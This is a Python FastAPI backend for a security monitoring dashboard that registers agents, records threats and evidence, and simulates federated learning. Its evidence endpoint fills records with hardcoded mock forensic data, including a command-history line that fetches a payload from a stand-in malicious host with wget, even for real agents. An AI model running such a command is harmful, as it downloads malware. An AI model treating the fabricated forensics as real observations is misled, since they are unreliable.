from fastapi import FastAPI, HTTPException, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Optional, Dict, Any
import asyncio
import json
import logging
from datetime import datetime, timezone
import uuid

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI(
    title="DIO Nerve Center API",
    description="AI Core for DIO Platform - Federated Learning & Coordination",
    version="1.0.0"
)

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Pydantic models
class Agent(BaseModel):
    id: str
    name: str
    hostname: str
    status: str
    rank: int
    cpu: float
    memory: float
    lastSeen: str  # Changed from last_seen to match frontend
    threats: int
    ipAddress: str  # Changed from ip_address to match frontend
    osType: str   # Changed from os_type to match frontend

class Threat(BaseModel):
    id: str
    name: str
    type: str
    severity: str
    description: str
    status: str
    detected_at: str
    agent_id: Optional[str] = None
    agent_info: Optional[Dict[str, Any]] = None

class AgentMetrics(BaseModel):
    agent_id: str
    cpu: float
    memory: float
    disk: float
    network: float
    processes: int
    timestamp: datetime

class Evidence(BaseModel):
    id: str
    agent_id: str
    type: str
    severity: str
    title: str
    description: str
    raw_data: str
    status: str
    confidence: float
    timestamp: datetime

# In-memory storage (replace with database in production)
agents: Dict[str, Agent] = {}
threats: Dict[str, Threat] = {}
evidence_store: Dict[str, Evidence] = {}  # Renamed to avoid conflicts
metrics: Dict[str, List[AgentMetrics]] = {}

# Background tasks
async def process_agent_data(agent_data: Dict[str, Any]):
    """Process incoming agent data and update AI models"""
    try:
        # Simulate AI processing
        await asyncio.sleep(0.1)
        
        # Update agent rank based on performance
        agent_id = agent_data.get('id')
        if agent_id in agents:
            current_rank = agents[agent_id].rank
            # Simple ranking logic based on threats and performance
            new_rank = min(4, current_rank + (1 if agent_data.get('threats', 0) == 0 else -1))
            agents[agent_id].rank = max(0, new_rank)
            
        logger.info(f"Processed data for agent {agent_id}")
    except Exception as e:
        logger.error(f"Error processing agent data: {e}")

async def federated_learning_cycle():
    """Simulate federated learning cycle"""
    while True:
        try:
            await asyncio.sleep(30)  # Run every 30 seconds
            
            # Collect learning data from agents
            learning_data = []
            for agent_id, agent in agents.items():
                if agent.status == 'active':
                    learning_data.append({
                        'agent_id': agent_id,
                        'rank': agent.rank,
                        'performance': 100 - agent.cpu,  # Simple performance metric
                        'threats_detected': agent.threats
                    })
            
            # Simulate model aggregation
            if learning_data:
                logger.info(f"Federated learning cycle with {len(learning_data)} agents")
                # Update global model (simplified)
                for data in learning_data:
                    agent_id = data['agent_id']
                    if agent_id in agents:
                        # Promote high-performing agents
                        if data['performance'] > 80 and data['threats_detected'] > 0:
                            agents[agent_id].rank = min(4, agents[agent_id].rank + 1)
                            
        except Exception as e:
            logger.error(f"Error in federated learning cycle: {e}")

# Start background task
@app.on_event("startup")
async def startup_event():
    asyncio.create_task(federated_learning_cycle())

# API Endpoints
@app.get("/")
async def root():
    return {
        "message": "DIO Nerve Center API",
        "status": "active",
        "version": "1.0.0",
        "timestamp": datetime.now().isoformat()
    }

@app.get("/health")
async def health_check():
    return {
        "status": "healthy",
        "component": "nerve_center",
        "agents_connected": len([a for a in agents.values() if a.status == "active"]),
        "threats_active": len([t for t in threats.values() if t.status == "active"]),
        "timestamp": datetime.now().isoformat()
    }

@app.get("/agents", response_model=List[Agent])
async def get_agents():
    """Get all registered agents"""
    return list(agents.values())

@app.post("/agents/register")
async def register_agent(agent_data: Dict[str, Any], background_tasks: BackgroundTasks):
    """Register a new agent"""
    try:
        agent_id = agent_data.get('id', str(uuid.uuid4()))
        
        agent = Agent(
            id=agent_id,
            name=agent_data.get('name', f'Agent-{agent_id[:8]}'),
            hostname=agent_data.get('hostname', 'unknown'),
            status='active',
            rank=0,
            cpu=0.0,
            memory=0.0,
            lastSeen=datetime.now(timezone.utc).isoformat(),
            threats=0,
            ipAddress=agent_data.get('ip_address', '0.0.0.0'),
            osType=agent_data.get('os_type', 'unknown')
        )
        
        agents[agent_id] = agent
        metrics[agent_id] = []
        
        # Schedule background processing
        background_tasks.add_task(process_agent_data, agent_data)
        
        logger.info(f"Registered new agent: {agent_id}")
        
        return {
            "success": True,
            "agent_id": agent_id,
            "message": "Agent registered successfully"
        }
    except Exception as e:
        logger.error(f"Error registering agent: {e}")
        raise HTTPException(status_code=500, detail="Failed to register agent")

@app.post("/agents/{agent_id}/metrics")
async def update_agent_metrics(agent_id: str, metrics_data: Dict[str, Any], background_tasks: BackgroundTasks):
    """Update agent metrics"""
    try:
        if agent_id not in agents:
            raise HTTPException(status_code=404, detail="Agent not found")
            
        # Update agent info
        agents[agent_id].cpu = metrics_data.get('cpu', 0)
        agents[agent_id].memory = metrics_data.get('memory', 0)
        agents[agent_id].lastSeen = datetime.now(timezone.utc).isoformat()
        
        # Store metrics
        metric = AgentMetrics(
            agent_id=agent_id,
            cpu=metrics_data.get('cpu', 0),
            memory=metrics_data.get('memory', 0),
            disk=metrics_data.get('disk', 0),
            network=metrics_data.get('network', 0),
            processes=metrics_data.get('processes', 0),
            timestamp=datetime.now(timezone.utc)
        )
        
        if agent_id not in metrics:
            metrics[agent_id] = []
        metrics[agent_id].append(metric)
        
        # Keep only last 100 metrics per agent
        if len(metrics[agent_id]) > 100:
            metrics[agent_id] = metrics[agent_id][-100:]
        
        # Schedule background processing
        background_tasks.add_task(process_agent_data, metrics_data)
        
        return {"success": True, "message": "Metrics updated"}
    except Exception as e:
        logger.error(f"Error updating metrics: {e}")
        raise HTTPException(status_code=500, detail="Failed to update metrics")

@app.get("/threats", response_model=List[Threat])
async def get_threats():
    """Get all detected threats"""
    return list(threats.values())

@app.post("/threats")
async def create_threat(threat_data: Dict[str, Any]):
    """Create a new threat record"""
    try:
        threat_id = threat_data.get('id', str(uuid.uuid4()))
        
        # Get real agent info if available
        agent_info_data = {}
        if threat_data.get('agent_id') and threat_data.get('agent_id') in agents:
            agent = agents[threat_data.get('agent_id')]
            agent_info_data = {
                'hostname': agent.hostname,
                'os_type': agent.osType,
                'ip_address': agent.ipAddress
            }
        else:
            agent_info_data = {
                'hostname': f"agent-{threat_data.get('agent_id', 'unknown')[:8]}",
                'os_type': 'Linux',
                'ip_address': '192.168.1.100'
            }
        
        threat = Threat(
            id=threat_id,
            name=threat_data.get('name', 'Unknown Threat'),
            type=threat_data.get('type', 'unknown'),
            severity=threat_data.get('severity', 'medium'),
            description=threat_data.get('description', ''),
            status='active',
            detected_at=datetime.now(timezone.utc).isoformat(),
            agent_id=threat_data.get('agent_id'),
            agent_info=agent_info_data
        )
        
        threats[threat_id] = threat
        
        logger.info(f"New threat detected: {threat.name}")
        
        return {
            "success": True,
            "threat_id": threat_id,
            "message": "Threat recorded successfully"
        }
    except Exception as e:
        logger.error(f"Error creating threat: {e}")
        raise HTTPException(status_code=500, detail="Failed to create threat")

@app.post("/evidence")
async def create_evidence(evidence_data: Dict[str, Any]):
    """Create evidence record"""
    try:
        evidence_id = evidence_data.get('id', str(uuid.uuid4()))
        
        # Debug: Log the received evidence data
        logger.info(f"Received evidence data: {evidence_data}")
        
        # Validate required fields
        required_fields = ['agent_id', 'type', 'severity', 'title', 'description']
        missing_fields = [field for field in required_fields if not evidence_data.get(field)]
        
        if missing_fields:
            logger.error(f"Missing required evidence fields: {missing_fields}")
            raise HTTPException(status_code=400, detail=f"Missing required fields: {missing_fields}")
        
        # Extract data from raw_data if available
        raw_data = evidence_data.get('raw_data', {})
        if isinstance(raw_data, str):
            raw_data = json.loads(raw_data)
        
        # Extract attack details from raw_data or use defaults
        attack_id = raw_data.get('attack_id', str(uuid.uuid4()))
        cpu_usage = raw_data.get('cpu_usage', 0)
        attack_type = raw_data.get('attack_type', 'unknown')
        
        # Get real agent info if available
        if evidence_data.get('agent_id') and evidence_data.get('agent_id') in agents:
            agent = agents[evidence_data.get('agent_id')]
            metrics_data = {
                'hostname': agent.hostname,
                'os_type': agent.osType,
                'ip_address': agent.ipAddress,
                'uptime': 3600,
                'memory': 45.2,
                'disk': 62.8,
                'network': 12.5,
                'processes': 156,
                'affected_processes': ['chrome.exe', 'powershell.exe'],
                'network_connections': ['192.168.1.100:443', '10.0.0.1:80'],
                'open_ports': [22, 80, 443, 8080],
                'running_services': ['sshd', 'nginx', 'docker'],
                'file_changes': ['/tmp/temp.exe', '/var/log/system.log'],
                'unusual_processes': ['wscript.exe', 'powershell.exe'],
                'anomalous_network_activity': True,
                'file_system_anomalies': ['/usr/bin/.hidden'],
                'registry_changes': ['HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'],
                'unauthorized_access_attempts': 3,
                'processes_terminated': ['malware.exe'],
                'network_connections_blocked': ['192.168.1.100:4444'],
                'files_quarantined': ['/tmp/malware.exe'],
                'ip_addresses_blocked': ['192.168.1.200'],
                'command_history': ['ls -la', 'wget http://malicious.com/payload.exe'],
                'network_traffic': {'inbound': 1024, 'outbound': 2048},
                'file_access': ['/etc/passwd', '/var/log/auth.log'],
                'process_creation': ['/bin/bash', '/usr/bin/python3'],
                'registry_modifications': ['HKLM\\Software\\Malware'],
                'user_activity': ['login', 'sudo su']
            }
        else:
            # Generate mock metrics data if not provided
            metrics_data = {
                'hostname': f"agent-{evidence_data.get('agent_id', 'unknown')[:8]}",
                'os_type': 'Linux',
                'ip_address': '192.168.1.100',
                'uptime': 3600,
                'memory': 45.2,
                'disk': 62.8,
                'network': 12.5,
                'processes': 156,
                'affected_processes': ['chrome.exe', 'powershell.exe'],
                'network_connections': ['192.168.1.100:443', '10.0.0.1:80'],
                'open_ports': [22, 80, 443, 8080],
                'running_services': ['sshd', 'nginx', 'docker'],
                'file_changes': ['/tmp/temp.exe', '/var/log/system.log'],
                'unusual_processes': ['wscript.exe', 'powershell.exe'],
                'anomalous_network_activity': True,
                'file_system_anomalies': ['/usr/bin/.hidden'],
                'registry_changes': ['HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'],
                'unauthorized_access_attempts': 3,
                'processes_terminated': ['malware.exe'],
                'network_connections_blocked': ['192.168.1.100:4444'],
                'files_quarantined': ['/tmp/malware.exe'],
                'ip_addresses_blocked': ['192.168.1.200'],
                'command_history': ['ls -la', 'wget http://malicious.com/payload.exe'],
                'network_traffic': {'inbound': 1024, 'outbound': 2048},
                'file_access': ['/etc/passwd', '/var/log/auth.log'],
                'process_creation': ['/bin/bash', '/usr/bin/python3'],
                'registry_modifications': ['HKLM\\Software\\Malware'],
                'user_activity': ['login', 'sudo su']
            }
        
        evidence = Evidence(
            id=evidence_id,
            agent_id=evidence_data.get('agent_id'),
            type=evidence_data.get('type'),
            severity=evidence_data.get('severity'),
            title=evidence_data.get('title'),
            description=evidence_data.get('description'),
            raw_data=json.dumps({
                'attack_id': attack_id,
                'cpu_usage': cpu_usage,
                'timestamp': datetime.now(timezone.utc).isoformat(),
                'attack_type': attack_type,
                'metrics': {
                    'cpu': cpu_usage,
                    'memory': metrics_data.get('memory', 0),
                    'disk': metrics_data.get('disk', 0),
                    'network': metrics_data.get('network', 0),
                    'processes': metrics_data.get('processes', 0)
                },
                'system_info': {
                    'hostname': metrics_data.get('hostname', 'unknown'),
                    'os_type': metrics_data.get('os_type', 'unknown'),
                    'ip_address': metrics_data.get('ip_address', '0.0.0.0'),
                    'uptime': metrics_data.get('uptime', 0)
                },
                'affected_processes': metrics_data.get('affected_processes', []),
                'network_connections': metrics_data.get('network_connections', []),
                'open_ports': metrics_data.get('open_ports', []),
                'running_services': metrics_data.get('running_services', []),
                'file_changes': metrics_data.get('file_changes', []),
                'resource_usage': {
                    'cpu': cpu_usage,
                    'memory': metrics_data.get('memory', 0),
                    'disk': metrics_data.get('disk', 0),
                    'network': metrics_data.get('network', 0)
                },
                'suspicious_indicators': {
                    'unusual_processes': metrics_data.get('unusual_processes', []),
                    'anomalous_network_activity': metrics_data.get('anomalous_network_activity', False),
                    'file_system_anomalies': metrics_data.get('file_system_anomalies', []),
                    'registry_changes': metrics_data.get('registry_changes', []),
                    'unauthorized_access_attempts': metrics_data.get('unauthorized_access_attempts', 0)
                },
                'mitigation_actions': {
                    'processes_terminated': metrics_data.get('processes_terminated', []),
                    'network_connections_blocked': metrics_data.get('network_connections_blocked', []),
                    'files_quarantined': metrics_data.get('files_quarantined', []),
                    'ip_addresses_blocked': metrics_data.get('ip_addresses_blocked', [])
                },
                'forensics_data': {
                    'command_history': metrics_data.get('command_history', []),
                    'network_traffic': metrics_data.get('network_traffic', {}),
                    'file_access': metrics_data.get('file_access', []),
                    'process_creation': metrics_data.get('process_creation', []),
                    'registry_modifications': metrics_data.get('registry_modifications', []),
                    'user_activity': metrics_data.get('user_activity', [])
                },
                'recommendations': {
                    'immediate_actions': [
                        f"Isolate agent {metrics_data.get('hostname', 'unknown')} from network",
                        f"Run full system scan on agent {metrics_data.get('hostname', 'unknown')}",
                        f"Update antivirus signatures on agent {metrics_data.get('hostname', 'unknown')}"
                    ],
                    'further_investigation': [
                        f"Analyze process patterns for agent {metrics_data.get('hostname', 'unknown')}",
                        f"Review network traffic from agent {metrics_data.get('hostname', 'unknown')}",
                        f"Check for persistence mechanisms on agent {metrics_data.get('hostname', 'unknown')}"
                    ]
                }
            }),
            status='open',
            confidence=evidence_data.get('confidence', 0.8736335825920105),
            timestamp=datetime.now(timezone.utc)
        )
        
        evidence_store[evidence_id] = evidence
        
        logger.info(f"New evidence created: {evidence.title}")
        logger.info(f"Evidence stored with ID: {evidence_id}")
        
        return {
            "success": True,
            "evidence_id": evidence_id,
            "message": "Evidence recorded successfully"
        }
    except HTTPException:
        raise  # Re-raise HTTP exceptions
    except Exception as e:
        logger.error(f"Error creating evidence: {e}")
        logger.error(f"Evidence data received: {evidence_data}")
        logger.error(f"Error type: {type(e).__name__}")
        logger.error(f"Error details: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Failed to create evidence: {str(e)}")

@app.get("/events", response_model=List[Dict[str, Any]])
async def get_events():
    """Get all events (evidence and threats)"""
    try:
        events = []
        
        # Add evidence as events
        for evidence_id, evidence in evidence_store.items():
            raw_data = json.loads(evidence.raw_data) if evidence.raw_data else {}
            events.append({
                "id": f"evidence-{evidence_id}",
                "type": "evidence",
                "severity": evidence.severity,
                "title": evidence.title,
                "description": evidence.description,
                "agent_id": evidence.agent_id,
                "timestamp": evidence.timestamp.isoformat(),
                "status": evidence.status,
                "details": raw_data,
                "processes": raw_data.get("suspicious_processes", []),
                "trigger": raw_data.get("attack_type", "unknown"),
                "metrics": raw_data.get("metrics", {}),
                "confidence": evidence.confidence
            })
        
        # Add threats as events
        for threat_id, threat in threats.items():
            events.append({
                "id": f"threat-{threat_id}",
                "type": "threat",
                "severity": threat.severity,
                "title": threat.name,
                "description": threat.description,
                "agent_id": getattr(threat, 'agent_id', 'unknown'),
                "timestamp": threat.detected_at,
                "status": threat.status,
                "details": {
                    "threat_type": threat.type,
                    "signature": getattr(threat, 'signature', None)
                },
                "confidence": 0.8
            })
        
        # Sort by timestamp (newest first)
        events.sort(key=lambda x: x["timestamp"], reverse=True)
        
        return events
    except Exception as e:
        logger.error(f"Error fetching events: {e}")
        return []

@app.post("/events/{event_id}/acknowledge")
async def acknowledge_event(event_id: str):
    """Acknowledge an event"""
    try:
        # Parse event_id to get type and actual ID
        if event_id.startswith("evidence-"):
            actual_id = event_id.replace("evidence-", "")
            if actual_id in evidence_store:
                evidence_store[actual_id].status = "acknowledged"
                logger.info(f"Event {event_id} acknowledged")
                return {"success": True, "message": "Event acknowledged"}
        elif event_id.startswith("threat-"):
            actual_id = event_id.replace("threat-", "")
            if actual_id in threats:
                threats[actual_id].status = "acknowledged"
                logger.info(f"Threat {event_id} acknowledged")
                return {"success": True, "message": "Threat acknowledged"}
        
        raise HTTPException(status_code=404, detail="Event not found")
    except Exception as e:
        logger.error(f"Error acknowledging event: {e}")
        raise HTTPException(status_code=500, detail="Failed to acknowledge event")

@app.get("/events/{event_id}")
async def get_event_details(event_id: str):
    """Get detailed information about a specific event"""
    try:
        # Parse event_id to get type and actual ID
        if event_id.startswith("evidence-"):
            actual_id = event_id.replace("evidence-", "")
            if actual_id in evidence:
                ev = evidence[actual_id]
                raw_data = json.loads(ev.raw_data) if ev.raw_data else {}
                return {
                    "id": event_id,
                    "type": "evidence",
                    "severity": ev.severity,
                    "title": ev.title,
                    "description": ev.description,
                    "agent_id": ev.agent_id,
                    "timestamp": ev.timestamp.isoformat(),
                    "status": ev.status,
                    "details": raw_data,
                    "processes": raw_data.get("suspicious_processes", []),
                    "trigger": raw_data.get("attack_type", "unknown"),
                    "metrics": raw_data.get("metrics", {}),
                    "confidence": ev.confidence,
                    "investigation_notes": ""
                }
        elif event_id.startswith("threat-"):
            actual_id = event_id.replace("threat-", "")
            if actual_id in threats:
                th = threats[actual_id]
                return {
                    "id": event_id,
                    "type": "threat",
                    "severity": th.severity,
                    "title": th.name,
                    "description": th.description,
                    "agent_id": getattr(th, 'agent_id', 'unknown'),
                    "timestamp": th.detected_at,
                    "status": th.status,
                    "details": {
                        "threat_type": th.type,
                        "signature": getattr(th, 'signature', None)
                    },
                    "confidence": 0.8,
                    "investigation_notes": ""
                }
        
        raise HTTPException(status_code=404, detail="Event not found")
    except Exception as e:
        logger.error(f"Error fetching event details: {e}")
        raise HTTPException(status_code=500, detail="Failed to fetch event details")

@app.get("/agents/{agent_id}/metrics")
async def get_agent_metrics(agent_id: str, limit: int = 50):
    """Get metrics for a specific agent"""
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    agent_metrics = metrics.get(agent_id, [])
    return agent_metrics[-limit:]

@app.get("/system/status")
async def get_system_status():
    """Get overall system status"""
    active_agents = len([a for a in agents.values() if a.status == "active"])
    active_threats = len([t for t in threats.values() if t.status == "active"])
    
    return {
        "nerve_center": {
            "status": "healthy",
            "uptime": "24h",  # Would calculate actual uptime
            "cpu_usage": 25.4,
            "memory_usage": 67.8
        },
        "agents": {
            "total": len(agents),
            "active": active_agents,
            "offline": len(agents) - active_agents
        },
        "threats": {
            "active": active_threats,
            "resolved": len(threats) - active_threats
        },
        "federated_learning": {
            "status": "active",
            "last_cycle": datetime.now().isoformat(),
            "participating_agents": active_agents
        }
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)